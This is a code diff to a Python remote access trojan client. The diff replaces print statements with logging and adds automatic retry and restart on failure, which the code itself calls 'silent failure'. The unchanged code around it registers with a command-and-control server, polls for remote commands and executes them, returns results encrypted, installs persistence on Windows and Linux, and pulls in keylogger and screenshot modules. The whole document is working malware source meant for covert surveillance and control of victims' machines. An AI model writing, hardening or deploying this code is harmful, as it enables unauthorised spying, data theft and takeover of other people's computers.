@@ -2,6 +2,8 @@ import requests
 import time
 import platform
 import socket
+import sys
+import traceback
 from client_identity_manager import ClientIdentityManager
 from config import HOST, ENCRYPTION_KEY
 from encryptor import Encryptor
@@ -12,6 +14,7 @@ from file_manager import FileManager
 from keylogger import Keylogger
 from screenshotManager import take_screenshot, ScreenshotManager
 from System_info import SystemInfo
+from logger import logger
 
 
 
@@ -35,7 +38,15 @@ class RATClient:
         self.screenshot_manager = ScreenshotManager()
         
         # System info support
-        self.system_info = SystemInfo()
+        try:
+            self.system_info = SystemInfo()
+        except Exception as e:
+            logger.error(f"Failed to initialize SystemInfo: {e}")
+            # Create a dummy system info
+            class DummySystemInfo:
+                def get_all_system_info(self):
+                    return {"error": "SystemInfo initialization failed"}
+            self.system_info = DummySystemInfo()
 
     
     def get_system_info(self):
@@ -67,9 +78,10 @@ class RATClient:
 
             encrypted_data = self.encryptor.encrypt(registration_msg)
             if not encrypted_data:
+                logger.error("Failed to encrypt registration message")
                 return False
             
-            print(f"[+] Attempting to register with C2 server...")
+            logger.info(f"Attempting to register with C2 server: {self.server_url}")
             
             response = requests.post(
                 f"{self.server_url}/register",
@@ -84,19 +96,20 @@ class RATClient:
 
                 if decrypted_response and decrypted_response.get('type') == 'success':
                     self.registered = True
-                    print(f"[+] ✅ Successfully registered with C2 server!")
+                    logger.info("Successfully registered with C2 server")
                     return True
             
-            print(f"[-] Registration failed: {response.status_code}")
+            logger.warning(f"Registration failed with status: {response.status_code}")
             return False
                 
 
-        except requests.exceptions.ConnectionError:
-            print(f"[-] Cannot connect to C2 server at {self.server_url}")
+        except requests.exceptions.ConnectionError as e:
+            logger.error(f"Cannot connect to C2 server at {self.server_url}: {e}")
             return False
 
         except Exception as e:
-            print(f"[-] Registration error: {e}")
+            logger.error(f"Registration error: {e}")
+            logger.debug(traceback.format_exc())
             return False
     
     
@@ -259,33 +272,35 @@ class RATClient:
             encrypted_data = self.encryptor.encrypt(get_commands_msg)
             
             if not encrypted_data:
+                logger.error("Failed to encrypt command poll message")
                 return
             
-            print(f"[DEBUG] Polling for commands from {self.server_url}/commands")
+            logger.debug(f"Polling for commands from {self.server_url}/commands")
             response = requests.post(
                 f'{self.server_url}/commands',
                 json={"data": encrypted_data},
                 timeout=30
             )
-            print(f"[DEBUG] Command poll response: {response.status_code}")
+            logger.debug(f"Command poll response: {response.status_code}")
             
             if response.status_code == 200:
                 response_data = response.json()
                 decrypted_response = self.encryptor.decrypt(response_data.get('data'))
 
-                print(f"[DEBUG] Client polling for commands. Response status: {response.status_code}")
+                logger.debug(f"Client polling for commands. Response status: {response.status_code}")
                 if decrypted_response and decrypted_response.get("type") == "commands":
                     commands = decrypted_response.get("commands", [])
                     for command in commands:
-                        print(f"[DEBUG] Executing command: {command.get('action')}")
+                        logger.info(f"Executing command: {command.get('action')}")
                         self.execute_command(command)
                 else:
-                    print(f"[DEBUG] No commands or invalid response: {decrypted_response}")
+                    logger.debug(f"No commands or invalid response")
             else:
-                print(f"[DEBUG] Command poll failed: {response.status_code} - {response.text}")
+                logger.warning(f"Command poll failed: {response.status_code}")
         
         except Exception as e:
-            print(f"[-] Error polling commands: {e}")
+            logger.error(f"Error polling commands: {e}")
+            logger.debug(traceback.format_exc())
  
     
     def execute_command(self, command):
@@ -294,7 +309,7 @@ class RATClient:
             action = command.get("action")
             data = command.get("data", {})
             
-            print(f"[CLIENT] Executing command {command_id}: {action}")
+            logger.info(f"Executing command {command_id}: {action}")
             
             # Route to appropriate handler
             if action.startswith("file_"):
@@ -308,71 +323,113 @@ class RATClient:
                     "data": data
                 })
             
-            print(f"[CLIENT] Command {command_id} result: {type(result)}, size: {len(str(result)) if result else 0}")
+            logger.debug(f"Command {command_id} result: {type(result)}, size: {len(str(result)) if result else 0}")
             
             # Send result back
             result_msg = Protocol.create_command_result_message(self.client_id, command_id, result)
             
             encrypted_result = self.encryptor.encrypt(result_msg)
             if encrypted_result:
-                print(f"[CLIENT] Submitting result for command {command_id}")
+                logger.debug(f"Submitting result for command {command_id}")
                 response = requests.post(
                     f"{self.server_url}/commands_result",
                     json={"data": encrypted_result},
                     timeout=10
                 )
-                print(f"[CLIENT] Result submission response: {response.status_code}")
+                logger.debug(f"Result submission response: {response.status_code}")
                 if response.status_code != 200:
-                    print(f"[CLIENT] Result submission failed: {response.text}")
+                    logger.error(f"Result submission failed: {response.text}")
             else:
-                print(f"[CLIENT] Failed to encrypt result")
+                logger.error(f"Failed to encrypt result")
         
         except Exception as e:
-            print(f"[CLIENT] Command execution error: {e}")
+            logger.error(f"Command execution error: {e}")
+            logger.debug(traceback.format_exc())
 
 
     def start(self):
-        print(f"[+] C2 Server: {self.server_url}")
+        try:
+            logger.info(f"Starting RAT client - C2 Server: {self.server_url}")
+            logger.info(f"Client ID: {self.client_id}")
 
-        if self.persistence.platform in ["Windows", "Linux"]:
-            self.persistence.install_persistence()
-        else:
-            print(f"[!] Persistence not supported on {self.persistence.platform}")
-        
-        # Initial registration
-        if not self.register():
-            print("[-] Initial registration failed, retrying in 30 seconds...")
-            time.sleep(30)
-            return self.start()
-        
-        heartbeat_count = 0
-        command_poll_count = 0
-        while True:
+            # Install persistence
             try:
-                if heartbeat_count % 6 == 0:  # Every 60 seconds
-                    print(f"[+] Heartbeat #{heartbeat_count} - Client active: {self.client_id}")
-                
-                if not self.send_heartbeat():
-                    print("[-] Heartbeat failed, attempting re-registration...")
-                    self.registered = False
-                    self.register()
-                
-                if command_poll_count % 3 == 0:
-                    self.poll_commands()
-                    
-                heartbeat_count += 1
-                command_poll_count += 1
-                time.sleep(10)  # Check every 10 seconds
-                
-            except KeyboardInterrupt:
-                print("\n[!] Client stopped by user")
-                break
+                if self.persistence.platform in ["Windows", "Linux"]:
+                    self.persistence.install_persistence()
+                    logger.info("Persistence installed successfully")
+                else:
+                    logger.warning(f"Persistence not supported on {self.persistence.platform}")
             except Exception as e:
-                print(f"[-] Error in main loop: {e}")
+                logger.error(f"Failed to install persistence: {e}")
+            
+            # Initial registration with retries
+            retry_count = 0
+            max_retries = 10
+            while retry_count < max_retries:
+                if self.register():
+                    logger.info("Successfully registered with server")
+                    break
+                retry_count += 1
+                logger.warning(f"Registration failed, retry {retry_count}/{max_retries} in 30 seconds...")
                 time.sleep(30)
+            
+            if retry_count >= max_retries:
+                logger.error("Max registration retries reached, continuing anyway...")
+            
+            # Main loop
+            heartbeat_count = 0
+            command_poll_count = 0
+            
+            logger.info("Entering main loop")
+            
+            while True:
+                try:
+                    if heartbeat_count % 6 == 0:  # Every 60 seconds
+                        logger.info(f"Heartbeat #{heartbeat_count} - Client active")
+                    
+                    if not self.send_heartbeat():
+                        logger.warning("Heartbeat failed, attempting re-registration...")
+                        self.registered = False
+                        self.register()
+                    
+                    if command_poll_count % 3 == 0:
+                        self.poll_commands()
+                        
+                    heartbeat_count += 1
+                    command_poll_count += 1
+                    time.sleep(10)  # Check every 10 seconds
+                    
+                except KeyboardInterrupt:
+                    logger.info("Client stopped by user")
+                    break
+                except Exception as e:
+                    logger.error(f"Error in main loop: {e}")
+                    logger.debug(traceback.format_exc())
+                    time.sleep(30)
+        
+        except Exception as e:
+            logger.critical(f"Fatal error in start(): {e}")
+            logger.debug(traceback.format_exc())
+            # Continue anyway - silent failure
+            time.sleep(60)
+            self.start()  # Restart
 
 
 
 if __name__ == "__main__":
-    client = RATClient()
-    client.start()
+    try:
+        logger.info("=" * 50)
+        logger.info("RAT Client Starting")
+        logger.info("=" * 50)
+        client = RATClient()
+        client.start()
+    except Exception as e:
+        logger.critical(f"Fatal error: {e}")
+        logger.debug(traceback.format_exc())
+        # Silent failure - restart after delay
+        time.sleep(60)
+        try:
+            client = RATClient()
+            client.start()
+        except:
+            pass  # Ultimate silent failure
